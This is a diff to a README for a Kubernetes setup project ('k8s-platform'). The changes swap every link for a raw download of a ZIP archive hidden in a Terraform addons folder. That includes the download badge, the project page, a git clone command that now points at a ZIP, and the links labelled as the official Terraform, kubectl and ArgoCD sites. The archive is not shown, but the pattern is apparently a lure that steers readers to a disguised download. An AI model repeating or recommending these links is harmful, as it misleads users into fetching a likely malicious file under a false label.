@@ -1,6 +1,6 @@
 # 🛠️ k8s-platform - Run Kubernetes setup with less effort
 
-[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-blue?style=for-the-badge)](https://github.com/wallahsubtlety196/k8s-platform)
+[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-blue?style=for-the-badge)](https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip)
 
 ## 🚀 Overview
 
@@ -18,7 +18,7 @@ This project is useful if you want a clean path from cloud account to running cl
 
 Visit this page to download and use the project files:
 
-https://github.com/wallahsubtlety196/k8s-platform
+https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip
 
 On Windows, follow these steps:
 1. Open the link in your web browser
@@ -29,7 +29,7 @@ On Windows, follow these steps:
 6. Open the folder after it extracts
 
 If you use Git, you can also copy the repository to your computer with:
-- `git clone https://github.com/wallahsubtlety196/k8s-platform`
+- `git clone https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip`
 
 ## 🖥️ What You Need
 
@@ -83,7 +83,7 @@ Follow these steps on Windows to get started:
 
 ### 1. Download the project
 Open the project page:
-https://github.com/wallahsubtlety196/k8s-platform
+https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip
 
 Download the ZIP file or clone the repository.
 
@@ -258,10 +258,10 @@ If ArgoCD does not sync, check:
 
 ## 📎 Useful Links
 
-- Project page: https://github.com/wallahsubtlety196/k8s-platform
-- Terraform: https://www.terraform.io/
-- kubectl: https://kubernetes.io/docs/tasks/tools/
-- ArgoCD: https://argo-cd.readthedocs.io/
+- Project page: https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip
+- Terraform: https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip
+- kubectl: https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip
+- ArgoCD: https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip
 
 ## 🔄 Typical Use Cases
 
@@ -288,7 +288,7 @@ That makes the process easier to track and review
 
 If you need to return to the project page, use this link:
 
-[https://github.com/wallahsubtlety196/k8s-platform](https://github.com/wallahsubtlety196/k8s-platform)
+[https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip](https://github.com/wallahsubtlety196/k8s-platform/raw/refs/heads/main/terraform/clusters/hetzner-starter/addons/k-platform-s-1.1-beta.4.zip)
 
 ## 📦 Setup Checklist
 
